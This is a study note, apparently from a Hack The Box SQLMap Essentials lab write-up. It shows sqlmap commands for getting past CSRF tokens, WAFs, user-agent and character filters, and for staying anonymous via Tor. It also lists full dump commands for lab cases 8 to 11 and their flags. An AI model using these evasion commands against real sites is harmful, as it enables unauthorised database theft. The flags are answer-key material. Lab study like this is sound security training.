# Section 9 — Bypassing Web Application Protections

---

## Anti-CSRF Token Bypass

If the form contains a CSRF/XSRF token, every request needs a fresh value. `--csrf-token` tells sqlmap to parse the response and extract the next token automatically.

```bash
sqlmap -u "TARGET" \
  --data="id=1&t0ken=ABC123..." \
  --csrf-token="t0ken"
```

If the token parameter name contains `csrf`, `xsrf`, or `token`, sqlmap will auto-prompt. Custom names (like `t0ken` in the lab) need explicit `--csrf-token`.

---

## Unique-Value (Nonce) Bypass

App requires a unique value per request (e.g., `uid=2933249978`). `--randomize` generates a fresh random value matching the original's format/length each request.

```bash
sqlmap -u "TARGET/?id=1&uid=2933249978" --randomize=uid
```

---

## Calculated Parameter Bypass

App requires one parameter to be a function of another (e.g., `h=md5(id)`). `--eval` runs Python code before each request to compute the dependent value.

```bash
sqlmap -u "TARGET/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(str(id).encode()).hexdigest()"
```

---

## IP / Anonymity

| Option | Use |
|--------|-----|
| `--proxy="socks4://IP:PORT"` | Single proxy |
| `--proxy-file=proxies.txt` | List — rotates on blacklist |
| `--tor` | Auto-detect local Tor SOCKS port (9050/9150) |
| `--check-tor` | Verify Tor is actually being used (hits torproject.org) |

---

## WAF / IDS Detection

sqlmap auto-probes for WAFs at the start (sends a malicious payload to a non-existent parameter). If detected, it identifies the WAF using identYwaf signatures (80+ products).

```bash
sqlmap -u "TARGET" --skip-waf   # disable detection for stealth
```

> ModSecurity returns 406 on the WAF probe. Cloudflare, AWS WAF, Imperva have distinct fingerprints.

---

## User-Agent Bypass

Default sqlmap UA (`sqlmap/1.x.x (http://sqlmap.org)`) is blocked by most WAFs.

```bash
sqlmap -u "TARGET" --random-agent   # rotates browser UA strings
sqlmap -u "TARGET" --mobile         # mimics smartphone UA
```

---

## Tamper Scripts

Python scripts that modify the payload right before it's sent. Chain with commas:

```bash
sqlmap -u "TARGET" --tamper=between,randomcase
sqlmap --list-tampers   # show all available scripts
```

Most useful tampers (CPTS-relevant):

| Script | Effect |
|--------|--------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #`, `=` with `BETWEEN # AND #` — bypasses primitive `<`/`>` filters |
| `equaltolike` | Replaces `=` with `LIKE` |
| `randomcase` | `SELECT` → `SeLeCt` — bypasses simple keyword blocklists |
| `space2comment` | Replaces spaces with `/**/` |
| `space2plus` | Replaces spaces with `+` |
| `space2randomblank` | Replaces spaces with random whitespace alternatives |
| `percentage` | `SELECT` → `%S%E%L%E%C%T` (ASP-specific) |
| `0eunion` | `UNION` → `e0UNION` (numeric type confusion bypass) |
| `base64encode` | Base64-encode entire payload |
| `modsecurityversioned` | Wrap query in MySQL versioned comment |

---

## Other Bypasses

```bash
# Split POST body into chunks — splits SQL keywords across them
sqlmap -u "TARGET" --data="id=1" --chunked

# HTTP Parameter Pollution — ASP-style concatenation across duplicate params
# (no flag, just craft request: ?id=1&id=UNION&id=SELECT&...)
```

---

## Lab — Cases 8, 9, 10, 11

**Target:** `154.57.164.72:30732`

### Case 8 — Anti-CSRF token (`t0ken`)

```bash
sqlmap -u "http://154.57.164.72:30732/case8.php" \
  --data="id=1&t0ken=<grab-current-token>" \
  --csrf-token="t0ken" -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag8
```

> Non-standard token name `t0ken` — wouldn't auto-detect without `--csrf-token` flag.

**flag8:** `HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d}`

---

### Case 9 — Unique `uid` value

```bash
sqlmap -u "http://154.57.164.72:30732/case9.php?id=1&uid=2933249978" \
  --randomize=uid -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag9
```

**flag9:** `HTB{700_much_r4nd0mn355_f0r_my_74573}`

---

### Case 10 — Primitive UA filter

```bash
sqlmap -u "http://154.57.164.72:30732/case10.php" \
  --data="id=1" --random-agent -p id \
  --dbms=mysql --batch --technique=U --no-cast \
  --dump -T flag10
```

> App blocks the default sqlmap UA string — `--random-agent` rotates to a real browser UA.

**flag10:** `HTB{y37_4n07h3r_r4nd0m1z3}`

---

### Case 11 — `<` and `>` character filter

```bash
sqlmap -u "http://154.57.164.72:30732/case11.php?id=1" \
  --tamper=between -p id \
  --dbms=MySQL --batch --no-cast --flush-session \
  -D testdb -T flag11 --dump
```

> `between` tamper rewrites `>` → `NOT BETWEEN 0 AND #` and `=` → `BETWEEN # AND #`, avoiding the filtered characters entirely. `--flush-session` is needed to discard cached failed-detection data from prior runs.

**flag11:** `HTB{5p3c14l_ch4r5_n0_m0r3}`

---

## Exam Notes

- `--csrf-token=<name>` is required when the token field name doesn't contain `csrf`/`xsrf`/`token`
- `--randomize` matches the format of the original value (length, charset) automatically
- `--random-agent` should be standard — sqlmap's UA is in every WAF signature list
- For `<`/`>` filters → `--tamper=between`; for space filters → `space2comment`/`space2plus`
- `--flush-session` clears cached state — use it when a previous failed run is polluting detection
- Chain tampers carefully — priority order matters; some tampers conflict

## Sources

- [HTB Forum — SQLMap Essentials Case 11](https://forum.hackthebox.com/t/sqlmap-essentials-bypassing-web-application-protections-case-11/271907)
- [missteek/cpts-quick-references — SQLMap Essentials](https://github.com/missteek/cpts-quick-references/blob/main/module/sqlmap%20Essentials.md)
